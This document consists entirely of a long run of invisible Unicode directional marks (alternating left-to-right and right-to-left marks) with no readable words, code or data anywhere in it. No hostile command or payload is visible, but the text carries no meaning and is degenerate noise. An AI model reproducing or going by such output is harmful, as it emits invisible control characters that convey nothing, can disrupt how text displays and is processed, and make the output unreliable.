‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎